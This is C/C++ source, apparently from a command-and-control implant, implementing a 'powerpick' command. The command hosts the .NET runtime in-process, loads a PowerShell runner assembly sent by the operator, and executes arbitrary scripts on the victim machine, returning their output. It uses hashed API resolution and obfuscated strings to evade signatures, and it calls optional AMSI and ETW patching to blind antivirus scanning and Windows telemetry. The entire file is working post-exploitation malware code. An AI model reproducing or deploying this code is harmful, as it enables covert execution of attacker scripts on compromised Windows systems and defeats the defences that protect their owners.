#include "config.h"
#ifdef INCLUDE_CMD_POWERPICK

#include "commands.h"
#include "common.h"

typedef HRESULT (WINAPI *fn_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
typedef HRESULT (WINAPI *fn_SafeArrayAccessData)(SAFEARRAY*, void**);
typedef HRESULT (WINAPI *fn_SafeArrayUnaccessData)(SAFEARRAY*);
typedef SAFEARRAY* (WINAPI *fn_SafeArrayCreate)(VARTYPE, UINT, SAFEARRAYBOUND*);
typedef SAFEARRAY* (WINAPI *fn_SafeArrayCreateVector)(VARTYPE, LONG, ULONG);
typedef HRESULT (WINAPI *fn_SafeArrayDestroy)(SAFEARRAY*);
typedef HRESULT (WINAPI *fn_SafeArrayPutElement)(SAFEARRAY*, LONG*, void*);
typedef BSTR    (WINAPI *fn_SysAllocString)(const OLECHAR*);
typedef void    (WINAPI *fn_SysFreeString)(BSTR);
typedef BOOL    (WINAPI *fn_SetStdHandle)(DWORD, HANDLE);
typedef BOOL    (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);

static void* _vtcall(void* obj, int index) {
    void** vtbl = *(void***)obj;
    return vtbl[index];
}

struct StackGuid {
    DWORD   Data1;
    WORD    Data2;
    WORD    Data3;
    BYTE    Data4[8];
};

struct ICLRMetaHost_vtbl {
    void* QueryInterface; void* AddRef; void* Release;
    void* GetRuntime;
    void* GetVersionFromFile; void* EnumerateInstalledRuntimes;
    void* EnumerateLoadedRuntimes; void* RequestRuntimeLoadedNotification;
    void* QueryLegacyV2RuntimeBinding; void* ExitProcess;
};
struct ICLRMetaHost { ICLRMetaHost_vtbl* lpVtbl; };

struct ICLRRuntimeInfo_vtbl {
    void* QueryInterface; void* AddRef; void* Release;
    void* GetVersionString; void* GetRuntimeDirectory; void* IsLoaded;
    void* LoadErrorString; void* LoadLibrary; void* GetProcAddress_ri;
    void* GetInterface;
};
struct ICLRRuntimeInfo { ICLRRuntimeInfo_vtbl* lpVtbl; };

struct ICorRuntimeHost_vtbl {
    void* QueryInterface; void* AddRef; void* Release;
    void* CreateLogicalThreadState; void* DeleteLogicalThreadState;
    void* SwitchInLogicalThreadState; void* SwitchOutLogicalThreadState;
    void* LocksHeldByLogicalThread; void* MapFile; void* GetConfiguration;
    void* Start;
    void* Stop; void* CreateDomain;
    void* GetDefaultDomain;
    void* EnumDomains; void* NextDomain; void* CloseEnum;
    void* CreateDomainEx; void* CreateDomainSetup; void* CreateEvidence;
    void* UnloadDomain; void* CurrentDomain;
};
struct ICorRuntimeHost { ICorRuntimeHost_vtbl* lpVtbl; };

struct PipeReaderCtx {
    PINSTANCE inst;
    HANDLE    h_pipe_read;
    BYTE*     output_buf;
    DWORD     output_len;
    DWORD     output_cap;
    volatile LONG done;
};

static DWORD WINAPI pipe_reader_fn(LPVOID param) {
    PipeReaderCtx* ctx = (PipeReaderCtx*)param;
    PINSTANCE inst = ctx->inst;
    DWORD available = 0;
    DWORD bytes_read = 0;

    while (!ctx->done) {
        available = 0;
        if (!inst->Win32.PeekNamedPipe(ctx->h_pipe_read, NULL, 0, NULL, &available, NULL))
            break;
        if (available > 0) {
            if (ctx->output_len + available > ctx->output_cap) {
                DWORD new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
                while (new_cap < ctx->output_len + available + 1) new_cap *= 2;
                ctx->output_buf = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
                ctx->output_cap = new_cap;
            }
            bytes_read = 0;
            inst->Win32.ReadFile(ctx->h_pipe_read,
                ctx->output_buf + ctx->output_len, available, &bytes_read, NULL);
            ctx->output_len += bytes_read;
        } else {
            inst->Win32.Sleep(10);
        }
    }

    while (TRUE) {
        available = 0;
        if (!inst->Win32.PeekNamedPipe(ctx->h_pipe_read, NULL, 0, NULL, &available, NULL))
            break;
        if (available == 0) break;
        if (ctx->output_len + available > ctx->output_cap) {
            DWORD new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
            while (new_cap < ctx->output_len + available + 1) new_cap *= 2;
            ctx->output_buf = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
            ctx->output_cap = new_cap;
        }
        bytes_read = 0;
        inst->Win32.ReadFile(ctx->h_pipe_read,
            ctx->output_buf + ctx->output_len, available, &bytes_read, NULL);
        ctx->output_len += bytes_read;
    }

    return 0;
}

VOID cmd_powerpick(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD runner_len = 0;
    BYTE* runner_data = parser_bytes(args, &runner_len);
    DWORD script_len = 0;
    char* script_str = parser_string(args, &script_len);

    if (!runner_data || runner_len == 0) {
        package_add_string(inst, response, "no PSRunner data");
        response->is_error = TRUE;
        return;
    }

    if (!script_str || script_len == 0) {
        package_add_string(inst, response, "no script provided");
        response->is_error = TRUE;
        return;
    }

    DBG(inst, "[ES] cmd_powerpick");

    fn_CreatePipe pCreatePipe = (fn_CreatePipe)resolve_function(
        inst->Modules.Kernel32, hash_string_djb2(XSTR("CreatePipe")));
    fn_SetStdHandle pSetStdHandle = (fn_SetStdHandle)resolve_function(
        inst->Modules.Kernel32, hash_string_djb2(XSTR("SetStdHandle")));

    if (!pCreatePipe) {
        package_add_string(inst, response, "CreatePipe resolve failed");
        response->is_error = TRUE;
        return;
    }

    if (!inst->ClrStdoutRedirected) {
        SECURITY_ATTRIBUTES sa_pipe;
        es_memset(&sa_pipe, 0, sizeof(sa_pipe));
        sa_pipe.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa_pipe.bInheritHandle = TRUE;
        pCreatePipe(&inst->ClrPipeRead, &inst->ClrPipeWrite, &sa_pipe, 0);
        if (pSetStdHandle) {
            pSetStdHandle((DWORD)-11, inst->ClrPipeWrite);
            pSetStdHandle((DWORD)-12, inst->ClrPipeWrite);
        }
        inst->ClrStdoutRedirected = TRUE;
    }

    xstr(_mscoree, "mscoree.dll");
    HMODULE h_mscoree = inst->Win32.LoadLibraryA(_mscoree);
    if (!h_mscoree) {
        package_add_string(inst, response, "mscoree.dll load failed");
        response->is_error = TRUE;
        return;
    }

    fn_CLRCreateInstance pCLRCreateInstance = (fn_CLRCreateInstance)resolve_function(
        (PVOID)h_mscoree, hash_string_djb2(XSTR("CLRCreateInstance")));
    if (!pCLRCreateInstance) {
        package_add_string(inst, response, "CLRCreateInstance not found");
        response->is_error = TRUE;
        return;
    }

    StackGuid clsid_metahost       = { 0x9280188d, 0x0e8e, 0x4867, { 0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde } };
    StackGuid iid_metahost         = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16 } };
    StackGuid iid_runtimeinfo      = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91 } };
    StackGuid clsid_corruntimehost = { 0xCB2F6723, 0xAB3A, 0x11d2, { 0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E } };
    StackGuid iid_corruntimehost   = { 0xCB2F6722, 0xAB3A, 0x11d2, { 0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E } };
    StackGuid iid_appdomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13 } };

    ICLRMetaHost* meta_host = NULL;
    HRESULT hr = pCLRCreateInstance(
        *(const GUID*)&clsid_metahost,
        *(const GUID*)&iid_metahost,
        (void**)&meta_host);
    if (FAILED(hr) || !meta_host) {
        package_add_string(inst, response, "CLRCreateInstance failed");
        response->is_error = TRUE;
        return;
    }

    wchar_t runtime_ver[] = { 'v','4','.','0','.','3','0','3','1','9','\0' };
    ICLRRuntimeInfo* runtime_info = NULL;
    typedef HRESULT (__stdcall *fn_GetRuntime)(ICLRMetaHost*, LPCWSTR, REFIID, LPVOID*);
    fn_GetRuntime pGetRuntime = (fn_GetRuntime)meta_host->lpVtbl->GetRuntime;
    hr = pGetRuntime(meta_host, runtime_ver,
        *(const GUID*)&iid_runtimeinfo, (void**)&runtime_info);
    if (FAILED(hr) || !runtime_info) {
        package_add_string(inst, response, "GetRuntime v4.0 failed");
        response->is_error = TRUE;
        return;
    }

    ICorRuntimeHost* runtime_host = NULL;
    typedef HRESULT (__stdcall *fn_GetInterface)(ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID*);
    fn_GetInterface pGetInterface = (fn_GetInterface)runtime_info->lpVtbl->GetInterface;
    hr = pGetInterface(runtime_info,
        *(const GUID*)&clsid_corruntimehost,
        *(const GUID*)&iid_corruntimehost, (void**)&runtime_host);
    if (FAILED(hr) || !runtime_host) {
        package_add_string(inst, response, "GetInterface ICorRuntimeHost failed");
        response->is_error = TRUE;
        return;
    }

    typedef HRESULT (__stdcall *fn_Start)(ICorRuntimeHost*);
    fn_Start pStart = (fn_Start)runtime_host->lpVtbl->Start;
    pStart(runtime_host);

    typedef HRESULT (__stdcall *fn_GetDefaultDomain)(ICorRuntimeHost*, IUnknown**);
    fn_GetDefaultDomain pGetDefaultDomain = (fn_GetDefaultDomain)runtime_host->lpVtbl->GetDefaultDomain;
    IUnknown* app_domain_unk = NULL;
    hr = pGetDefaultDomain(runtime_host, &app_domain_unk);
    if (FAILED(hr) || !app_domain_unk) {
        package_add_string(inst, response, "GetDefaultDomain failed");
        response->is_error = TRUE;
        return;
    }

    void* app_domain = NULL;
    typedef HRESULT (__stdcall *fn_QI)(IUnknown*, REFIID, void**);
    fn_QI pQI = (fn_QI)_vtcall(app_domain_unk, 0);
    hr = pQI(app_domain_unk, *(const GUID*)&iid_appdomain, &app_domain);
    if (FAILED(hr) || !app_domain) {
        package_add_string(inst, response, "QI _AppDomain failed");
        response->is_error = TRUE;
        return;
    }

    xstr(_oleaut32, "oleaut32.dll");
    HMODULE h_oleaut32 = inst->Win32.LoadLibraryA(_oleaut32);
    if (!h_oleaut32) {
        package_add_string(inst, response, "oleaut32 load failed");
        response->is_error = TRUE;
        return;
    }

    fn_SafeArrayCreate        pSACreate      = (fn_SafeArrayCreate)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayCreate")));
    fn_SafeArrayAccessData    pSAAccessData  = (fn_SafeArrayAccessData)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayAccessData")));
    fn_SafeArrayUnaccessData  pSAUnaccessData= (fn_SafeArrayUnaccessData)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayUnaccessData")));
    fn_SafeArrayDestroy       pSADestroy     = (fn_SafeArrayDestroy)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayDestroy")));
    fn_SafeArrayCreateVector  pSACreateVec   = (fn_SafeArrayCreateVector)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayCreateVector")));
    fn_SafeArrayPutElement    pSAPutElement  = (fn_SafeArrayPutElement)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SafeArrayPutElement")));
    fn_SysAllocString         pSysAlloc      = (fn_SysAllocString)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SysAllocString")));
    fn_SysFreeString          pSysFree       = (fn_SysFreeString)resolve_function((PVOID)h_oleaut32, hash_string_djb2(XSTR("SysFreeString")));

    if (!pSACreate || !pSAAccessData || !pSADestroy || !pSACreateVec || !pSAPutElement || !pSysAlloc) {
        package_add_string(inst, response, "oleaut32 API resolve failed");
        response->is_error = TRUE;
        return;
    }

    // Load PSRunner assembly via _AppDomain::Load_3(Byte[])
    SAFEARRAYBOUND bounds;
    bounds.lLbound = 0;
    bounds.cElements = runner_len;
    SAFEARRAY* sa_runner = pSACreate(VT_UI1, 1, &bounds);
    if (!sa_runner) {
        package_add_string(inst, response, "SafeArrayCreate failed");
        response->is_error = TRUE;
        return;
    }

    void* sa_data = NULL;
    pSAAccessData(sa_runner, &sa_data);
    es_memcpy(sa_data, runner_data, runner_len);
    pSAUnaccessData(sa_runner);

    void* assembly = NULL;
    typedef HRESULT (__stdcall *fn_Load3)(void*, SAFEARRAY*, void**);
    fn_Load3 pLoad3 = (fn_Load3)_vtcall(app_domain, 45);
    hr = pLoad3(app_domain, sa_runner, &assembly);
    pSADestroy(sa_runner);

    if (FAILED(hr) || !assembly) {
        char errbuf[128];
        es_memset(errbuf, 0, sizeof(errbuf));
        char hex[] = "0123456789ABCDEF";
        char* p = errbuf;
        const char* prefix = "Load_3 PSRunner failed hr=0x";
        while (*prefix) *p++ = *prefix++;
        DWORD h = (DWORD)hr;
        for (int i = 7; i >= 0; i--) *p++ = hex[(h >> (i * 4)) & 0xF];
        const char* mid = " len=";
        while (*mid) *p++ = *mid++;
        DWORD rl = runner_len;
        char tmp[16]; int ti = 0;
        if (rl == 0) { *p++ = '0'; }
        else { while (rl > 0) { tmp[ti++] = '0' + (rl % 10); rl /= 10; } for (int j = ti-1; j>=0; j--) *p++ = tmp[j]; }
        package_add_string(inst, response, errbuf);
        response->is_error = TRUE;
        return;
    }

    // _Assembly::get_EntryPoint
    void* method_info = NULL;
    typedef HRESULT (__stdcall *fn_GetEntryPoint)(void*, void**);
    fn_GetEntryPoint pGetEntryPoint = (fn_GetEntryPoint)_vtcall(assembly, 16);
    hr = pGetEntryPoint(assembly, &method_info);
    if (FAILED(hr) || !method_info) {
        package_add_string(inst, response, "get_EntryPoint failed");
        response->is_error = TRUE;
        return;
    }

    // Build args: single BSTR containing the PowerShell script
    // PSRunner.Main(string[] args) expects args[0] = script
    DWORD wscript_len = script_len + 1;
    wchar_t* wscript = (wchar_t*)es_malloc(inst, wscript_len * sizeof(wchar_t));
    es_memset(wscript, 0, wscript_len * sizeof(wchar_t));
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, script_str, script_len, wscript, wscript_len - 1);

    BSTR bstr_script = pSysAlloc(wscript);
    es_free(inst, wscript);

    SAFEARRAY* sa_string_args = pSACreateVec(VT_BSTR, 0, 1);
    LONG idx_zero = 0;
    pSAPutElement(sa_string_args, &idx_zero, bstr_script);
    pSysFree(bstr_script);

    // Wrap string[] in VARIANT, then in outer SAFEARRAY(VARIANT) for Invoke_3
    VARIANT v_args;
    es_memset(&v_args, 0, sizeof(VARIANT));
    v_args.vt = VT_ARRAY | VT_BSTR;
    v_args.parray = sa_string_args;

    SAFEARRAY* sa_params = pSACreateVec(VT_VARIANT, 0, 1);
    pSAPutElement(sa_params, &idx_zero, &v_args);

    VARIANT v_obj;
    es_memset(&v_obj, 0, sizeof(VARIANT));
    v_obj.vt = VT_EMPTY;

    VARIANT v_result;
    es_memset(&v_result, 0, sizeof(VARIANT));

#ifdef INCLUDE_EVASION_AMSI
    patch_amsi(inst);
#endif
#ifdef INCLUDE_EVASION_ETW
    patch_etw(inst);
#endif

    PipeReaderCtx reader_ctx;
    es_memset(&reader_ctx, 0, sizeof(reader_ctx));
    reader_ctx.inst        = inst;
    reader_ctx.h_pipe_read = inst->ClrPipeRead;
    reader_ctx.done        = 0;

    HANDLE h_reader = inst->Win32.CreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)pipe_reader_fn,
        &reader_ctx, 0, NULL);

    // _MethodInfo::Invoke_3
    typedef HRESULT (__stdcall *fn_Invoke3)(void*, VARIANT, SAFEARRAY*, VARIANT*);
    fn_Invoke3 pInvoke3 = (fn_Invoke3)_vtcall(method_info, 37);
    hr = pInvoke3(method_info, v_obj, sa_params, &v_result);

    reader_ctx.done = 1;
    if (h_reader) {
        inst->Win32.WaitForSingleObject(h_reader, 5000);
        inst->Win32.CloseHandle(h_reader);
    }

    BYTE* output_buf = reader_ctx.output_buf;
    DWORD output_len = reader_ctx.output_len;

    pSADestroy(sa_params);
    pSADestroy(sa_string_args);

    if (FAILED(hr)) {
        if (output_buf && output_len > 0) {
            output_buf[output_len] = '\0';
            package_add_string(inst, response, (const char*)output_buf);
            es_free(inst, output_buf);
        } else {
            package_add_string(inst, response, "Invoke_3 PSRunner failed");
        }
        response->is_error = TRUE;
        return;
    }

    if (output_buf && output_len > 0) {
        output_buf[output_len] = '\0';
        package_add_string(inst, response, (const char*)output_buf);
        es_free(inst, output_buf);
    } else {
        package_add_string(inst, response, "(no output)");
    }
}

#endif
